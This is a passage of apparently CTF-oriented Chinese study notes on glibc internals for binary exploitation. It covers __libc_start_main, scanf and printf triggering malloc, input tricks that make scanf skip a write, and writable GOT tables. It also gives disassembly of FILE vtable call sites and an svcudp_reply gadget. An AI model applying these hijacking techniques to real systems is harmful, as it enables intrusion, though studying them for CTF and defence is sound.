(__libc_fatal);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize libpthread if linked in.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__pthread_initialize_minimal != <span class="literal">NULL</span>)</span><br><span class="line">    __pthread_initialize_minimal ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set up the pointer guard value.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> pointer_chk_guard = _dl_setup_pointer_guard (_dl_random,</span><br><span class="line"> stack_chk_guard);</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> THREAD_SET_POINTER_GUARD</span></span><br><span class="line">  THREAD_SET_POINTER_GUARD (pointer_chk_guard);</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  __pointer_chk_guard_local = pointer_chk_guard;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* !SHARED  */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Register the destructor of the dynamic linker if there is any.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (rtld_fini != <span class="literal">NULL</span>))</span><br><span class="line">    __cxa_atexit ((<span class="type">void</span> (*) (<span class="type">void</span> *)) rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Call the initializer of the libc.  This is only needed here if we</span></span><br><span class="line"><span class="comment">     are compiling for the static library in which case we haven&#x27;t</span></span><br><span class="line"><span class="comment">     run the constructors in `_dl_start_user&#x27;.  */</span></span><br><span class="line">  __libc_init_first (argc, argv, __environ);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Register the destructor of the program, if any.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fini)</span><br><span class="line">    __cxa_atexit ((<span class="type">void</span> (*) (<span class="type">void</span> *)) fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Some security at this point.  Prevent starting a SUID binary where</span></span><br><span class="line"><span class="comment">     the standard file descriptors are not opened.  We have to do this</span></span><br><span class="line"><span class="comment">     only for statically linked applications since otherwise the dynamic</span></span><br><span class="line"><span class="comment">     loader did the work already.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (__libc_enable_secure, <span class="number">0</span>))</span><br><span class="line">    __libc_check_standard_fds ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Call the initializer of the program, if any.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">    GLRO(dl_debug_printf) (<span class="string">&quot;\ninitialize program: %s\n\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (init)</span><br><span class="line">    (*init) (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Auditing checkpoint: we have a new object.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_naudit) &gt; <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">audit_ifaces</span> *<span class="title">afct</span> =</span> GLRO(dl_audit);</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">head</span> =</span> GL(dl_ns)[LM_ID_BASE]._ns_loaded;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> cnt = <span class="number">0</span>; cnt &lt; GLRO(dl_naudit); ++cnt)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (afct-&gt;preinit != <span class="literal">NULL</span>)</span><br><span class="line">    afct-&gt;preinit (&amp;link_map_audit_state (head, cnt)-&gt;cookie);</span><br><span class="line"></span><br><span class="line">  afct = afct-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))</span><br><span class="line">    GLRO(dl_debug_printf) (<span class="string">&quot;\ntransferring control: %s\n\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  _dl_debug_initialize (<span class="number">0</span>, LM_ID_BASE);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_CLEANUP_JMP_BUF</span></span><br><span class="line">  <span class="comment">/* Memory for the cancellation buffer.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pthread_unwind_buf</span> <span class="title">unwind_buf</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> not_first_call;</span><br><span class="line">  not_first_call = setjmp ((<span class="keyword">struct</span> __jmp_buf_tag *) unwind_buf.cancel_jmp_buf);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (! not_first_call))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">pthread</span> *<span class="title">self</span> =</span> THREAD_SELF;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Store old info.  */</span></span><br><span class="line">      unwind_buf.priv.data.prev = THREAD_GETMEM (self, cleanup_jmp_buf);</span><br><span class="line">      unwind_buf.priv.data.cleanup = THREAD_GETMEM (self, cleanup);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Store the new cleanup handler info.  */</span></span><br><span class="line">      THREAD_SETMEM (self, cleanup_jmp_buf, &amp;unwind_buf);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Run the program.  */</span></span><br><span class="line">      result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Remove the thread-local data.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      PTHFCT_CALL (ptr__nptl_deallocate_tsd, ());</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">      <span class="keyword">extern</span> <span class="type">void</span> __nptl_deallocate_tsd (<span class="type">void</span>) __attribute ((weak));</span><br><span class="line">      __nptl_deallocate_tsd ();</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* One less thread.  Decrement the counter.  If it is zero we</span></span><br><span class="line"><span class="comment"> terminate the entire process.  */</span></span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> *ptr = __libc_pthread_functions.ptr_nthreads;</span><br><span class="line"><span class="meta">#  <span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (ptr);</span><br><span class="line"><span class="meta">#  <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">      <span class="keyword">extern</span> <span class="type">unsigned</span> <span class="type">int</span> __nptl_nthreads __attribute ((weak));</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> *<span class="type">const</span> ptr = &amp;__nptl_nthreads;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (! atomic_decrement_and_test (ptr))</span><br><span class="line"><span class="comment">/* Not much left to do but to exit the thread, not the process.  */</span></span><br><span class="line">__exit_thread ();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="comment">/* Nothing fancy, just call the function.  */</span></span><br><span class="line">  result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span> (result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码挺长提几个重要的点</p><ol><li>__libc_start_main共有7个参数,不过正常利用下只需要注意前三个就行,分别是main,argc,argv</li><li>函数过程中会调用read从而在栈上留下read的libc地址,一些情况下可以利用其中的syscall</li><li>最后启动main时main的三个参数分别是argc,argv,和__environ</li></ol><p>__libc_start_main也可以启动除main以外的函数.甚至都不需要是函数只要是可执行的代码就行,不过需要另作一些布置</p><h2 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h2><p>在 glibc中，<code>__isoc99_scanf</code> 和 <code>scanf</code> 实际上是同一个函数的两个不同名称。<code>__isoc99_scanf</code> 是 <code>scanf</code> 函数的 ISO C99 标准兼容版本的别名。ISO C99 是 C 语言的标准之一，它引入了一些新的特性和改进，其中包括一些涉及格式化输入的变化。</p><p>scanf与 read 函数相同，可以读取 \ x00 后面的内容，仅将<strong>换行符</strong>作为输入读取的结束标志。</p><p>不过这里要注意的是，%s 参数会以空格作为分隔符，也就是说，如果输入中含有空格，那么<strong>空格前后的内容会被分配到不同的 %s 参数中</strong>。</p><p>scanf函数实际调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_vscanf (<span class="type">const</span> <span class="type">char</span> *format, va_list args)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __vfscanf_internal (<span class="built_in">stdin</span>, format, args, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__vfscanf_internal的代码挺长,不做分析</p><h3 id="scanf触发malloc探究"><a href="#scanf触发malloc探究" class="headerlink" title="scanf触发malloc探究"></a>scanf触发malloc探究</h3><p>看最终触发malloc的部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span></span><br><span class="line">__libc_scratch_buffer_grow_preserve (<span class="keyword">struct</span> scratch_buffer *buffer)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> new_length = <span class="number">2</span> * buffer-&gt;length;</span><br><span class="line">  <span class="type">void</span> *new_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buffer-&gt;data == buffer-&gt;__space.__c)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Move buffer to the heap.  No overflow is possible because</span></span><br><span class="line"><span class="comment"> buffer-&gt;length describes a small buffer on the stack.  */</span></span><br><span class="line">      new_ptr = <span class="built_in">malloc</span> (new_length);</span><br><span class="line">      <span class="keyword">if</span> (new_ptr == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_ptr, buffer-&gt;__space.__c, buffer-&gt;length);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Buffer was already on the heap.  Check for overflow.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_likely (new_length &gt;= buffer-&gt;length))</span><br><span class="line">new_ptr = <span class="built_in">realloc</span> (buffer-&gt;data, new_length);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  __set_errno (ENOMEM);</span><br><span class="line">  new_ptr = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (new_ptr == <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Deallocate, but buffer must remain valid to free.  */</span></span><br><span class="line">  <span class="built_in">free</span> (buffer-&gt;data);</span><br><span class="line">  scratch_buffer_init (buffer);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Install new heap-based buffer.  */</span></span><br><span class="line">  buffer-&gt;data = new_ptr;</span><br><span class="line">  buffer-&gt;length = new_length;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_scratch_buffer_grow_preserve)</span><br></pre></td></tr></table></figure><p>这里触发了<strong>malloc</strong></p><p>不过可以发现,在scanf函数执行完后,并不能找到这个chunk,</p><p>显然在后面的操作中还触发了<strong>free</strong></p><p>可以写一些demo跟进调试发现确实如此</p><p><strong>触发条件</strong></p><ol><li>scanf的格式化字符串参数应该为<strong>数字类</strong>(%d,%lld,%lf,%zu)</li><li>发送的字符应该为数字字符,即只能<strong>‘0’-‘9’</strong></li><li>发送的长度应该&gt;=1024(不含换行符)</li></ol><p><strong>细节问题:</strong></p><ol><li><strong>最终变量被写为多少</strong></li></ol><p>如果发送1024个’0’,那么scanf最终的读取大小为<strong>0</strong></p><p>但如果发送1024个大于’0’的字符则有几种情况:</p><div class="table-container"><table><thead><tr><th>%d</th><th>FFFFFFFF(-1)</th></tr></thead><tbody><tr><td>%lld</td><td>7FFFFFFFFFFFFFFF</td></tr><tr><td>%lf</td><td>inf</td></tr><tr><td>%zu</td><td>FFFFFFFFFFFFFFFF</td></tr></tbody></table></div><ol><li><strong>malloc申请多大的内存</strong></li></ol><p>malloc申请的大小为标准输入流默认缓冲区大小的两倍,一般是0x800,chunk实际大小0x810,属于largebin</p><p>会触发malloc_consolidate,如果有fastbin chunk的话会尝试合并并放入unsorted bin,经过unsorted遍历一般会放置到对应的bin</p><h4 id="类似的printf"><a href="#类似的printf" class="headerlink" title="类似的printf"></a>类似的printf</h4><p>与scanf类似printf也会触发malloc</p><p>例如<code>printf(&quot;%65535c&quot;,var);</code></p><p>其中65535差不多就是临界了,再往低可能就不触发malloc</p><p>这样就会触发申请一个很大的chunk(实际大小0x10030)</p><p>之后同样也会被free</p><p>还有说gets和puts也有这样的机制,不过我测试时并没有成功</p><h4 id="相关利用"><a href="#相关利用" class="headerlink" title="相关利用"></a>相关利用</h4><p>在低版本中可以用来触发hook函数</p><p>或者更通用的用于触发malloc_consolidate来完成一些利用</p><h3 id="hateful-dot"><a href="#hateful-dot" class="headerlink" title="hateful dot"></a>hateful dot</h3><p>scanf在读取数字时能否使其不读取改变原值直接跳过?</p><p>例如<code>scanf(&quot;%d&quot;,&amp;var);</code>,要保证var的值不改变</p><p>如果直接输入换行符,scanf因为没有发现数字,会继续等待输入,显然不行</p><p>这就需要用到scanf读取数字时的一个特性</p><p>当scanf读取数字时,可以用<code>.</code>来绕过其对变量值的写入</p><p>当读取整型时:可以用<code>.1234534565</code>或者单独<code>.</code>绕过</p><p>当读取浮点数时:只能用<code>.</code>绕过</p><p><strong>与之类似的还有<code>+</code>和<code>-</code></strong></p><p>其实scanf读数字时,<strong>所有的非数字类字符都能使得跳过该次scanf</strong></p><p>但是除了<code>+-.</code></p><p>剩下的字符在该次scanf跳过后还会保存在缓冲区中,使得接下来的scanf依然会失效,当然如果有其他io函数可以读取这个字符另作考虑</p><p>且如果scanf读取的是<code>+-.</code>以外的非数字字符,<u>那么本次scanf甚至不要求接收换行符</u></p><h2 id="exit-amp-amp-exit"><a href="#exit-amp-amp-exit" class="headerlink" title="exit&amp;&amp;_exit"></a>exit&amp;&amp;_exit</h2><p>在Linux中，<code>exit()</code>和<code>_exit()</code>函数都用于终止一个程序，但它们在终止程序时的行为有显著差异：</p><ol><li><strong><code>exit()</code> 函数：</strong><ul><li><code>exit()</code> 是标准C库函数，定义在 <code>&lt;stdlib.h&gt;</code> 中。</li><li>在调用 <code>exit()</code> 时，首先执行所有注册的退出函数（通过 <code>atexit()</code> 注册），<strong>清理I/O</strong>（如关闭所有标准I/O流，刷新缓冲区等）。</li><li>然后，<code>exit()</code> 调用底层的 <code>_exit()</code> 或 <code>_Exit()</code> 函数来结束程序。</li></ul></li><li><strong><code>_exit()</code> 函数：</strong><ul><li><code>_exit()</code> 是POSIX系统调用，定义在 <code>&lt;unistd.h&gt;</code> 中。</li><li>当调用 <code>_exit()</code> 时，程序会立即终止，<strong>不会执行任何清理操作</strong>，如不刷新I/O缓冲区、不调用注册的退出函数等。</li><li>这个函数通常在需要立即终止程序，而不关心清理资源或数据的完整性时使用，例如，在子进程中避免复制父进程的缓冲区。</li></ul></li></ol><h2 id="so的got表"><a href="#so的got表" class="headerlink" title="so的got表"></a>so的got表</h2><p>checksec可以发现libc和ld的RELRO保护都是Partial RELRO</p><p>且ida打开可以观察到其中确实有.got.plt表,里面有不少函数</p><p>这就意味着如果能够修改so的got表也能做到劫持流</p><h2 id="常见IO函数触发vtable调用的位置"><a href="#常见IO函数触发vtable调用的位置" class="headerlink" title="常见IO函数触发vtable调用的位置"></a>常见IO函数触发vtable调用的位置</h2><p>有些时候程序不能或者很难满足下列三个条件</p><ol><li>通过exit退出</li><li>main能返回</li><li>触发__malloc_assert</li></ol><p>那么利用伪造的chunk触发vtable调用,显然并不容易做到,</p><p>这种情况下可以考虑通过stdin,stdout来触发vtable调用</p><p>这里列出几个常见函数触发vtable调用的位置(只列出现的比较早的)</p><p><strong>注意:</strong></p><p><strong>一般都有两个要求</strong></p><ol><li><strong>是窄字符模式</strong>(_mode&lt;=0)</li><li><strong>_IO_USER_LOCK标志位为0</strong></li></ol><p>且调用时第一个参数rdi一般都是对应FILE结构体指针</p><p>因为各种参数的影响,如果实操与所示结果不同,那么<strong>需要另行调试</strong>并做构造调整</p><h3 id="scanf-amp-amp-gets"><a href="#scanf-amp-amp-gets" class="headerlink" title="scanf&amp;&amp;gets"></a>scanf&amp;&amp;gets</h3><p><strong>scanf和gets调用vtable几乎一致</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7e53c92 &lt;+98&gt;:mov    rbx,QWORD PTR [rbp+0xd8]</span><br><span class="line">0x00007ffff7e53c99 &lt;+105&gt;:lea    rdx,[rip+0x156c00]        # 0x7ffff7faa8a0 &lt;_IO_helper_jumps&gt;</span><br><span class="line">0x00007ffff7e53ca0 &lt;+112&gt;:lea    rax,[rip+0x157961]        # 0x7ffff7fab608</span><br><span class="line">0x00007ffff7e53ca7 &lt;+119&gt;:sub    rax,rdx</span><br><span class="line">0x00007ffff7e53caa &lt;+122&gt;:mov    rcx,rbx</span><br><span class="line">0x00007ffff7e53cad &lt;+125&gt;:sub    rcx,rdx</span><br><span class="line">0x00007ffff7e53cb0 &lt;+128&gt;:cmp    rax,rcx</span><br><span class="line">0x00007ffff7e53cb3 &lt;+131&gt;:jbe    0x7ffff7e53de0 &lt;__GI___uflow+432&gt;</span><br><span class="line">0x00007ffff7e53cb9 &lt;+137&gt;:mov    rax,QWORD PTR [rbx+0x28]</span><br><span class="line">0x00007ffff7e53cbd &lt;+141&gt;:add    rsp,0x8</span><br><span class="line">0x00007ffff7e53cc1 &lt;+145&gt;:mov    rdi,rbp</span><br><span class="line">0x00007ffff7e53cc4 &lt;+148&gt;:pop    rbx</span><br><span class="line">0x00007ffff7e53cc5 &lt;+149&gt;:pop    rbp</span><br><span class="line">0x00007ffff7e53cc6 &lt;+150&gt;:jmp    rax</span><br></pre></td></tr></table></figure><p>在进入__uflow处,存在一次调用vtable,重点关注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7e53c92 &lt;+98&gt;:mov    rbx,QWORD PTR [rbp+0xd8]</span><br><span class="line">.....</span><br><span class="line">0x00007ffff7e53cb9 &lt;+137&gt;:mov    rax,QWORD PTR [rbx+0x28]</span><br><span class="line">.....</span><br><span class="line">0x00007ffff7e53cc6 &lt;+150&gt;:jmp    rax</span><br></pre></td></tr></table></figure><p>其中rbp是<em>IO_2_1_stdin\</em>,取出了stdin的vtable+0x28并调用</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   0x00007ffff7e53f6e &lt;+30&gt;:mov    rbp,QWORD PTR [rdi+0xd8]</span><br><span class="line">   0x00007ffff7e53f75 &lt;+37&gt;:mov    rcx,rbp</span><br><span class="line">   0x00007ffff7e53f78 &lt;+40&gt;:sub    rcx,rdx</span><br><span class="line">   0x00007ffff7e53f7b &lt;+43&gt;:cmp    rax,rcx</span><br><span class="line">   0x00007ffff7e53f7e &lt;+46&gt;:jbe    0x7ffff7e53fa8 &lt;__GI__IO_default_uflow+88&gt;</span><br><span class="line">   0x00007ffff7e53f80 &lt;+48&gt;:mov    rdi,rbx</span><br><span class="line">=&gt; 0x00007ffff7e53f83 &lt;+51&gt;:call   QWORD PTR [rbp+0x20]</span><br></pre></td></tr></table></figure><p>进入_IO_default_uflow后,取出了stdin的vtable+0x20并调用</p><h3 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   0x00007ffff7e464c7 &lt;+167&gt;:mov    r14,QWORD PTR [rdi+0xd8]</span><br><span class="line">   0x00007ffff7e464ce &lt;+174&gt;:lea    rdx,[rip+0x1643cb]        # 0x7ffff7faa8a0 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7e464d5 &lt;+181&gt;:lea    rax,[rip+0x16512c]        # 0x7ffff7fab608</span><br><span class="line">   0x00007ffff7e464dc &lt;+188&gt;:sub    rax,rdx</span><br><span class="line">   0x00007ffff7e464df &lt;+191&gt;:mov    rcx,r14</span><br><span class="line">   0x00007ffff7e464e2 &lt;+194&gt;:sub    rcx,rdx</span><br><span class="line">=&gt; 0x00007ffff7e464e5 &lt;+197&gt;:cmp    rax,rcx</span><br><span class="line">   0x00007ffff7e464e8 &lt;+200&gt;:jbe    0x7ffff7e46580 &lt;__GI__IO_puts+352&gt;</span><br><span class="line">   0x00007ffff7e464ee &lt;+206&gt;:mov    rdx,rbx</span><br><span class="line">   0x00007ffff7e464f1 &lt;+209&gt;:mov    rsi,r12</span><br><span class="line">   0x00007ffff7e464f4 &lt;+212&gt;:call   QWORD PTR [r14+0x38]</span><br></pre></td></tr></table></figure><p>puts主函数很快便会调用vtable+0x38</p><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   0x00007ffff7e3892a &lt;+202&gt;:mov    rax,QWORD PTR [r12+0xd8]</span><br><span class="line">   0x00007ffff7e38932 &lt;+210&gt;:lea    rcx,[rip+0x172ccf]        # 0x7ffff7fab608</span><br><span class="line">   0x00007ffff7e38939 &lt;+217&gt;:sub    rcx,rdx</span><br><span class="line">   0x00007ffff7e3893c &lt;+220&gt;:mov    QWORD PTR [rbp-0x4d0],rdx</span><br><span class="line">   0x00007ffff7e38943 &lt;+227&gt;:mov    QWORD PTR [rbp-0x4c8],rcx</span><br><span class="line">   0x00007ffff7e3894a &lt;+234&gt;:mov    rsi,rcx</span><br><span class="line">   0x00007ffff7e3894d &lt;+237&gt;:mov    rcx,rax</span><br><span class="line">   0x00007ffff7e38950 &lt;+240&gt;:sub    rcx,rdx</span><br><span class="line">   0x00007ffff7e38953 &lt;+243&gt;:cmp    rsi,rcx</span><br><span class="line">   0x00007ffff7e38956 &lt;+246&gt;:jbe    0x7ffff7e38d30 &lt;__vfprintf_internal+1232&gt;</span><br><span class="line">   0x00007ffff7e3895c &lt;+252&gt;:mov    r15,QWORD PTR [rbp-0x4b8]</span><br><span class="line">   0x00007ffff7e38963 &lt;+259&gt;:mov    rsi,r13</span><br><span class="line">=&gt; 0x00007ffff7e38966 &lt;+262&gt;:mov    rdi,r12</span><br><span class="line">   0x00007ffff7e38969 &lt;+265&gt;:sub    r15,r13</span><br><span class="line">   0x00007ffff7e3896c &lt;+268&gt;:mov    rdx,r15</span><br><span class="line">   0x00007ffff7e3896f &lt;+271&gt;:call   QWORD PTR [rax+0x38]</span><br></pre></td></tr></table></figure><p>__vfprintf_internal处同样会调用vtable+0x38</p><h3 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h3><p>更多的类似getchar,putchar等io函数可以用相同的办法调试得到</p><h2 id="svcudp-reply"><a href="#svcudp-reply" class="headerlink" title="svcudp_reply"></a>svcudp_reply</h2><p>该函数中存在一个有用的gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7f16dea &lt;+26&gt;:mov    rbp,QWORD PTR [rdi+0x48]</span><br><span class="line">0x00007ffff7f16dee &lt;+30&gt;:mov    rax,QWORD PTR [rbp+0x18]</span><br><span class="line">0x00007ffff7f16df2 &lt;+34&gt;:lea    r13,[rbp+0x10]</span><br><span class="line">0x00007ffff7f16df6 &lt;+38&gt;:mov    DWORD PTR [rbp+0x10],0x0</span><br><span class="line">0x00007ffff7f16dfd &lt;+45&gt;:mov    rdi,r13</span><br><span class="line">0x00007ffff7f16e00 &lt;+48&gt;:call   QWORD PTR [rax+0x28]</span><br><span class="line">0x00007ffff7f16e03 &lt;+51&gt;:mov    rax,QWORD PTR [rbp+0x8]</span><br></pre></td></tr></table></figure><h1 id="ELF相关"><a href="#ELF相关" class="headerlink" title="ELF相关"></a>ELF相关</h1><h2 id="timeout"><a href="#timeout" class="headerlink" title="timeout"></a>timeout</h2><p>elf运行时有时会报错<code>timeout: the monitored command dumped core</code></p><p>一般有两种情况会导致这个报错</p><p><strong>一是栈对齐问题</strong>,函数执行过程中碰到了movaps指令,其操作数未十六进制对齐</p><p>可尝试通过增加ret gadget解决</p><p><strong>二是程序未正常退出</strong></p><p>一般是使返回地址为exit等让程序正常退出的函数地址</p><p><strong>三是超时</strong></p><h2 id="标准流符号"><a href="#标准流符号" class="headerlink" title="标准流符号"></a>标准流符号</h2><p>大多数elf程序的bss段上</p><p>都会存在<code>stdin,stdout,stderr</code>这几个符号中的一两个</p><p>这几个符号在程序开始后都会指向各自对应的在libc中的FILE结构体</p><p>某些情况下可以用其来获得libc或者无输出爆破libc</p><h2 id="elf映射"><a href="#elf映射" class="headerlink" title="elf映射"></a>elf映射</h2><p>elf在映射时<strong>bss段会被映射两次</strong>,可以在gdb中利用search指令查找</p><h2 id="vdso"><a href="#vdso" class="headerlink" 